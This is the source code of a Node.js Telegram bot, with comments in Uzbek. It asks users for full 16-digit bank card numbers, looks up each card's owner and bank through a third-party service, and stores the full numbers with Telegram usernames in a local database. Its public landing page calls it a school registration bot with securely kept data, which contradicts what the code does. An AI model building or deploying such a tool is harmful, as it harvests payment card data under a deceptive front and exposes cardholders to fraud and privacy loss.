const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const sqlite3 = require("sqlite3").verbose();
const dotenv = require("dotenv");
const axios = require("axios");

dotenv.config();

const botToken = process.env.BOT_TOKEN;
const port = process.env.PORT || 3000;
const url = process.env.url;

const app = express();
app.use(express.json());

const bot = new TelegramBot(botToken, { polling: true });

// ✅ Users obyektini e’lon qilamiz
const users = {};

// ✅ SQLite ochish
const db = new sqlite3.Database("./users.db");

// ✅ Jadvalni yaratib qo‘yish (agar mavjud bo‘lmasa)
db.run(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    cardnumber TEXT,
    owner TEXT,
    bank TEXT
  )
`);

// 🔗 Kanal ID yoki username
const CHANNEL_ID = "@kimyonazarovuz"; // username shaklida

// ✅ A'zolikni tekshirish funksiyasi
async function isSubscribed(userId) {
  try {
    const member = await bot.getChatMember(CHANNEL_ID, userId);
    return (
      member.status === "member" ||
      member.status === "creator" ||
      member.status === "administrator"
    );
  } catch (e) {
    console.error("getChatMember xato:", e.message);
    return false;
  }
}

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;

  // Avval kanalga obuna bo‘lganini tekshiramiz
  const subscribed = await isSubscribed(chatId);

  if (!subscribed) {
    return bot.sendMessage(
      chatId,
      `❌ Botdan foydalanish uchun kanalimizga obuna bo‘ling:\n\n👉 <a href="https://t.me/kimyonazarovuz">KimyonazarovUZ</a>\n\n✅ Obuna bo‘lgach, /start buyrug‘ini qaytadan yuboring.`,
      { parse_mode: "HTML", disable_web_page_preview: true }
    );
  }

  users[chatId] = { step: "password" };

  bot.sendMessage(chatId, `Assalomu alaykum ${msg.from.first_name}`, {
    parse_mode: "HTML",
  });

  setTimeout(() => {
    bot.sendMessage(chatId, "Iltimos karta raqamini kiriting (16 ta raqam):");
  }, 500);
});

bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text?.trim().replace(/\s+/g, "");

  // 🔐 faqat obuna bo‘lganlar ishlatsin
  const subscribed = await isSubscribed(chatId);
  if (!subscribed) {
    return bot.sendMessage(
      chatId,
      `❌ Botdan foydalanish uchun kanalimizga obuna bo‘ling:\n\n👉 <a href="https://t.me/kimyonazarovuz">KimyonazarovUZ</a>\n\n✅ Obuna bo‘lgach, /start buyrug‘ini qaytadan yuboring.`,
      { parse_mode: "HTML", disable_web_page_preview: true }
    );
  }

  // ✅ faqat 16 ta raqam bo‘lsa
  if (/^\d{16}$/.test(text)) {
    try {
      bot.sendMessage(chatId, "⏳ Karta tekshirilmoqda...");

      const { data } = await axios.get(
        `https://reposu.org/payme/card/${text}`
      );

      if (data.success) {
        const { owner, mask, bank, type } = data.result;

        db.run(
          `
          INSERT OR REPLACE INTO users (id, username, cardnumber, owner, bank)
          VALUES (?, ?, ?, ?, ?)
        `,
          [msg.from.id, msg.from.username, text, owner, bank],
          (err) => {
            if (err) {
              console.error("DB Xato:", err.message);
            } else {
              console.log("Foydalanuvchi saqlandi!");
            }
          }
        );

        const cardInfo = `
💳 <b>Karta ma'lumotlari</b>

👤 Egasi: <b>${owner}</b>
🔢 Raqam: <b>${mask}</b>
🏦 Bank: <b>${bank}</b>
📌 Turi: <b>${type}</b>
        `.trim();

        bot.sendMessage(chatId, cardInfo, { parse_mode: "HTML" });
      } else {
        bot.sendMessage(chatId, "❌ Karta topilmadi yoki noto‘g‘ri raqam.");
      }
    } catch (err) {
      console.error("API xato:", err.message);
      bot.sendMessage(chatId, "⚠️ Xatolik yuz berdi. Keyinroq urinib ko‘ring.");
    }
    return;
  }
});

// 🔄 Render self-ping
setInterval(() => {
  axios
    .get('https://bankcard-t4m0.onrender.com')
    .then(() => console.log("🔄 Self-ping OK"))
    .catch((err) => console.error("❌ Self-ping error:", err.message));
}, 60 * 1000);

app.get("/", (req, res) => { res.send(`<!DOCTYPE html> <html lang="uz"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Kimyonazarov's Bot</title> <!-- ✅ Tailwind CSS CDN --> <script src="https://cdn.tailwindcss.com"></script> </head> <body class="bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white min-h-screen flex flex-col items-center justify-center px-4"> <h1 class="text-4xl md:text-5xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 mb-6 text-center"> Kimyonazarov's School Bot </h1> <p class="text-lg md:text-xl text-gray-300 mb-8 text-center max-w-2xl leading-relaxed"> Bu Telegram bot maktab o'quvchilari uchun maxsus ishlab chiqilgan.<br> O'quvchilar o'z ma'lumotlarini kiritish orqali sinf tizimida ro'yxatdan o'tishadi.<br> Ma'lumotlar xavfsiz saqlanadi. </p> <a href="https://t.me/m_kimyonazarov" target="_blank" class="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-300 ease-in-out shadow-md"> 📲 Admin bilan bog'lanish </a> <footer class="mt-10 text-sm text-gray-500 absolute bottom-4 text-center"> &copy; 2025 Kimyonazarov. Barcha huquqlar himoyalangan. </footer> </body> </html> `); });
app.listen(port, () => {
  console.log(`Bot running on port ${port}`);
});
